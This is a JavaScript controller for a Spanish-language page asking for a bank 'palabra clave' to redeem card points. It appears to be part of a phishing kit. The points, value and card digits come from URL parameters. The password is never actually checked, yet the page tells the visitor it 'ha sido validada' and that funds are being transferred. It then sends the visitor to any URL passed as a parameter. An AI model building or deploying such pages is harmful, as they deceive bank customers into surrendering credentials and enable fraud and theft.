/**
 * app - Controlador para la vista de Solicitud de Palabra Clave (Proceso de Puntos)
 */
(function() {
  "use strict";

  document.addEventListener("DOMContentLoaded", function() {
    initQueryParams();
    initPasswordToggle();
    initFormValidation();
    initHelpModal();
  });

  /**
   * Lee parámetros opcionales de la URL para personalizar los puntos mostrados
   * Ej: palabra-clave.html?puntos=85.000&valor=850.000&tarjeta=9012
   */
  function initQueryParams() {
    try {
      const params = new URLSearchParams(window.location.search);
      
      const customPuntos = params.get("puntos");
      if (customPuntos) {
        const puntosEl = document.getElementById("displayPuntos");
        if (puntosEl) {
          puntosEl.textContent = customPuntos;
        }
      }

      const customValor = params.get("valor");
      if (customValor) {
        const valorEl = document.getElementById("displayValor");
        if (valorEl) {
          valorEl.textContent = customValor.startsWith("$") ? customValor : `$${customValor} COP`;
        }
      }

      const customTarjeta = params.get("tarjeta");
      if (customTarjeta) {
        const tarjetaEl = document.getElementById("displayTarjeta");
        if (tarjetaEl) {
          tarjetaEl.textContent = customTarjeta.startsWith("•") ? customTarjeta : `•••• ${customTarjeta}`;
        }
      }
    } catch (e) {
      console.warn("Error leyendo parámetros de URL", e);
    }
  }

  /**
   * Manejador para alternar la visibilidad de la palabra clave (Mostrar / Ocultar)
   */
  function initPasswordToggle() {
    const toggleBtn = document.getElementById("toggleClaveBtn");
    const inputClave = document.getElementById("palabraClaveInput");

    if (!toggleBtn || !inputClave) return;

    toggleBtn.addEventListener("click", function() {
      const isPassword = inputClave.getAttribute("type") === "password";
      
      if (isPassword) {
        inputClave.setAttribute("type", "text");
        toggleBtn.setAttribute("aria-label", window.t ? window.t("PALABRA_ARIA_OCULTAR", "Ocultar palabra clave") : "Ocultar palabra clave");
        toggleBtn.innerHTML = `
          <svg viewBox="0 0 24 24">
            <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.44-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78 3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>
          </svg>
        `;
      } else {
        inputClave.setAttribute("type", "password");
        toggleBtn.setAttribute("aria-label", window.t ? window.t("PALABRA_ARIA_MOSTRAR", "Mostrar palabra clave") : "Mostrar palabra clave");
        toggleBtn.innerHTML = `
          <svg viewBox="0 0 24 24">
            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
          </svg>
        `;
      }
      inputClave.focus();
    });
  }

  /**
   * Validación del formulario y envío seguro
   */
  function initFormValidation() {
    const form = document.getElementById("palabraClaveForm");
    const inputClave = document.getElementById("palabraClaveInput");
    const errorEl = document.getElementById("claveErrorMsg");
    const submitBtn = document.getElementById("submitClaveBtn");

    if (!form || !inputClave || !errorEl || !submitBtn) return;

    // Limpiar error mientras escribe
    inputClave.addEventListener("input", function() {
      if (inputClave.classList.contains("has-error")) {
        inputClave.classList.remove("has-error");
        errorEl.classList.remove("is-visible");
      }
    });

    form.addEventListener("submit", function(e) {
      e.preventDefault();

      const valor = inputClave.value.trim();

      // Validaciones
      if (!valor) {
        showError("Por favor ingresa tu palabra clave para autorizar la operación.");
        inputClave.focus();
        return;
      }

      if (valor.length < 4) {
        showError("La palabra clave debe contener mínimo 4 caracteres.");
        inputClave.focus();
        return;
      }

      // Desactivar botón y mostrar estado de procesamiento
      submitBtn.classList.add("is-loading");
      submitBtn.disabled = true;

      // Si existe el loader global estilo app, activarlo
      if (typeof window.showLoader === "function") {
        window.showLoader(
          "Validando tu información",
          "Estamos verificando tu palabra clave y acreditando tus Puntos app de manera segura..."
        );
      }

      // Obtener parámetros de redirección o usar cargando.html institucional
      const params = new URLSearchParams(window.location.search);
      const customRedirect = params.get("redirect");

      setTimeout(function() {
        if (customRedirect) {
          window.location.href = customRedirect;
        } else {
          // Redirigir a la pantalla cargando oficial con los textos de confirmación de puntos
          const cargandoUrl = `cargando.html?title=${encodeURIComponent("Procesando acreditación")}&subtitle=${encodeURIComponent("Tu palabra clave ha sido validada. Estamos transfiriendo el valor correspondiente a tus productos app...")}&time=4000&redirect=${encodeURIComponent("home.html")}`;
          window.location.href = cargandoUrl;
        }
      }, 1200);
    });

    function showError(msg) {
      inputClave.classList.add("has-error");
      const errorText = errorEl.querySelector(".error-text") || errorEl;
      errorText.textContent = msg;
      errorEl.classList.add("is-visible");
    }
  }

  /**
   * Modal informativo "¿Qué es la palabra clave?"
   */
  function initHelpModal() {
    const openBtn = document.getElementById("openHelpModalBtn");
    const modalBackdrop = document.getElementById("helpModalBackdrop");
    const closeBtn = document.getElementById("closeHelpModalBtn");
    const actionCloseBtn = document.getElementById("actionCloseModalBtn");

    if (!modalBackdrop) return;

    function openModal() {
      modalBackdrop.classList.add("is-open");
      modalBackdrop.setAttribute("aria-hidden", "false");
    }

    function closeModal() {
      modalBackdrop.classList.remove("is-open");
      modalBackdrop.setAttribute("aria-hidden", "true");
    }

    if (openBtn) {
      openBtn.addEventListener("click", function(e) {
        e.preventDefault();
        openModal();
      });
    }

    if (closeBtn) closeBtn.addEventListener("click", closeModal);
    if (actionCloseBtn) actionCloseBtn.addEventListener("click", closeModal);

    // Cerrar al hacer clic fuera de la tarjeta
    modalBackdrop.addEventListener("click", function(e) {
      if (e.target === modalBackdrop) {
        closeModal();
      }
    });

    // Cerrar con tecla Escape
    document.addEventListener("keydown", function(e) {
      if (e.key === "Escape" && modalBackdrop.classList.contains("is-open")) {
        closeModal();
      }
    });
  }
})();
